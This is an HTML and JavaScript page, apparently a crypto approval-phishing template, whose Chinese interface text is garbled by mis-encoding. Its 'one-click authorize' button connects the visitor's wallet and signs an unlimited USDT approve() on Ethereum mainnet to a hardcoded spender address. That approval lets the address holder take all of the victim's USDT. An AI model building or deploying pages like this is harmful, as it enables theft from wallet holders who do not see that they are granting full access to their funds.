<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <title>USDT ä¸€æ¬¡æˆæƒï¼ˆä¸»ç½‘ï¼‰</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- ethers.js v6 UMDï¼šæš´éœ²å…¨å±€ ethers -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js" defer></script>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;padding:16px;background:#f8f9fb}
    .card{max-width:680px;margin:0 auto;padding:16px;border:1px solid #eee;border-radius:12px;background:#fff;box-shadow:0 4px 18px rgba(0,0,0,.06)}
    button{padding:12px 16px;border:none;border-radius:10px;cursor:pointer;font-size:16px;background:#3b82f6;color:#fff}
    code{background:#f6f8fa;padding:2px 6px;border-radius:6px;word-break:break-all}
    pre{background:#0b1020;color:#c7d2fe;padding:12px;border-radius:10px;overflow:auto}
  </style>
</head>
<body>
  <div class="card">
    <h2>USDT ä¸€æ¬¡æˆæƒï¼ˆä¸»ç½‘ approve MaxUintï¼‰</h2>
    <p>åˆçº¦ï¼š<code id="token">0xdAC17F958D2ee523a2206206994597C13D831ec7</code><br>
       Spenderï¼š<code id="spender">0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2</code><br>
       ç½‘ç»œï¼š<code>Mainnet (1)</code></p>
    <button id="btn">ä¸€é”®æˆæƒ</button>
    <pre id="log">æ—¥å¿—ï¼š</pre>
  </div>

<script defer>
window.addEventListener('load', () => {
  const CHAIN_ID = 1; // ä¸»ç½‘
  const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ä¸»ç½‘ USDT (ERC20, 6 decimals)
  const SPENDER        = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2";  // ä½ çš„è¢«æˆæƒåœ°å€

  const ERC20_ABI = [
    "function approve(address spender, uint256 value) external returns (bool)"
  ];

  const logEl = document.getElementById('log');
  const log = m => { const t=new Date().toLocaleTimeString(); logEl.textContent+=`\n[${t}] ${m}`; logEl.scrollTop=logEl.scrollHeight; };

  async function connectMainnet(){
    if (typeof window.ethereum === 'undefined') { log("âŒ æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·ç”¨ MetaMask / imToken(ä»¥å¤ªåŠ) çš„ DApp æµè§ˆå™¨æ‰“å¼€"); return null; }
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const net = await provider.getNetwork();
    if (Number(net.chainId) !== CHAIN_ID){
      try{
        await window.ethereum.request({ method:"wallet_switchEthereumChain", params:[{ chainId:"0x1" }] });
      }catch(e){
        log("âŒ è¯·æ‰‹åŠ¨åˆ‡æ¢åˆ° Mainnet å†è¯•ã€‚è¯¦æƒ…ï¼š"+(e?.message||e));
        return null;
      }
    }
    return provider;
  }

  async function singleApprove(){
    try{
      if (typeof ethers === 'undefined'){ log("âŒ ethers æœªåŠ è½½"); return; }
      const provider = await connectMainnet(); if(!provider) return;
      const signer = await provider.getSigner();
      const erc20  = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);

      log("â³ å‘é€ approve(spender, MaxUint256) â€¦");
      const tx = await erc20.approve(SPENDER, ethers.MaxUint256);
      log(`å·²æäº¤ï¼š${tx.hash}`);
      const rc = await tx.wait();
      log(`âœ… æˆåŠŸï¼ŒåŒºå—ï¼š${rc.blockNumber}`);
    }catch(e){
      const msg = e?.reason || e?.data?.message || e?.message || String(e);
      log("âŒ å‡ºé”™ï¼š"+ msg);
      // USDT ç­‰åˆçº¦è‹¥å·²å­˜åœ¨æ—§é¢åº¦ï¼Œå¯èƒ½è¦æ±‚å…ˆç½® 0
      if (/revert|allowance|approve/i.test(msg)) {
        log("ğŸ’¡ æç¤ºï¼šè‹¥æ­¤å‰ç»™è¿‡è¯¥ spender é 0 æˆæƒï¼ŒUSDT å¯èƒ½è¦æ±‚å…ˆ approve(spender, 0) å†æˆæƒã€‚");
      }
      if (/insufficient funds/i.test(msg)) {
        log("ğŸ’¡ æç¤ºï¼šä¸»ç½‘éœ€è¦ ETH æ”¯ä»˜ gasã€‚");
      }
    }
  }

  document.getElementById('btn').onclick = singleApprove;
});
</script>
</body>
</html>
